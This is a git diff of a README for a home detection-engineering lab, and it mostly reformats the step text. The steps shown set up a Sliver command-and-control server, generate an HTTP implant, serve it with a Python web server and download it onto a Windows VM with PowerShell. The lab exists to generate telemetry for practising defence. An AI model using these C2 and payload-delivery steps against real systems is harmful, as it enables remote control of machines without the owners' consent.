@@ -208,7 +208,7 @@ LimaCharlie will now start shipping Sysmon logs which provide a wealth of EDR-li
 
 The other reason we are ingesting Sysmon logs is that the built-in Sigma rules we previously enabled largely depend on Sysmon logs as that is what most of them were written for.
 
-*Pro Tip*: Now would be a good time to Snapshot your Windows VM.
+Now would be a good time to Snapshot your Windows VM.
 <br>
 </details>
 
@@ -216,19 +216,19 @@ The other reason we are ingesting Sysmon logs is that the built-in Sigma rules w
   <summary><h2><b>Section 4: Setup Attack System </b></h2></summary>
   I recommend using an SSH client to access the Ubuntu VM so that you can easily copy/paste commands.
 
-1. Open your CLI
+1. **Open your CLI**
 
 ```
 ssh username@[Linux_VM_IP]
 ```
 
-2. Now, from within this new SSH session, proceed with the following instructions to setup our attacker C2 server. First, gain access to the root shell to make life easier.
+2. **Now, from within this new SSH session, proceed with the following instructions to setup our attacker C2 server. First, gain access to the root shell to make life easier.**
 
 ```
 sudo su
 ```
 
-3. Run the following commands to download Sliver, a Command & Control (C2) framework by BishopFox. I recommend copy/pasting the entire block as there is line-wrapping occurring.
+3. **Run the following commands to download Sliver, a Command & Control (C2) framework by BishopFox. I recommend copy/pasting the entire block as there is line-wrapping occurring.**
 
 - Download Sliver Linux server binary
 ```
@@ -252,44 +252,45 @@ Explore the LimaCharlie web interface to learn more about what it can do!
 
 
 <details>
-  <summary><h2><b>Section 5: Generate the Command&Control payload </b></h2></summary>
+  <summary><h2><b>Section 5: Generate the Command & Control payload </b></h2></summary>
   Either from your SSH session or directly from your Ubuntu Server, take the following actions:
+  <br>
 
-  1. Access root shell and change dir to Sliver install
+  1. **Access root shell and change dir to Sliver install**
 
 ```
 sudo su
 cd /opt/sliver
 ```
 
-  2. Launch Sliver server
+  2. **Launch Sliver server**
 
 ```
 sliver-server
 ```
 
-  3. Generate C2 session payload. Use your Linux VM’s IP address
+  3. **Generate C2 session payload. Use your Linux VM’s IP address**
 ```
 generate --http [Linux_VM_IP] --save /opt/sliver
 ```
 
-  4. Confirm the new implant configuration
+  4. **Confirm the new implant configuration**
 ```
 implants
 ```
 
-  5. Now we have a C2 payload we can drop onto our Windows VM. Exit Sliver for now.
+  5. **Now we have a C2 payload we can drop onto our Windows VM. Exit Sliver for now.**
 ```
 exit
 ```
 
-  6. To easily download the C2 payload from the Linux VM to the Windows VM, use this python trick that spins up a temp web server
+  6. **To easily download the C2 payload from the Linux VM to the Windows VM, use this python trick that spins up a temp web server**
 ```
 cd /opt/sliver
 python3 -m http.server 80
 ```
 
-  7. Switch to the Windows VM and launch an Admin PowerShell console to download the implant from Ubuntu server
+  7. **Switch to the Windows VM and launch an Admin PowerShell console to download the implant from Ubuntu server**
 ```
 IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
 ```
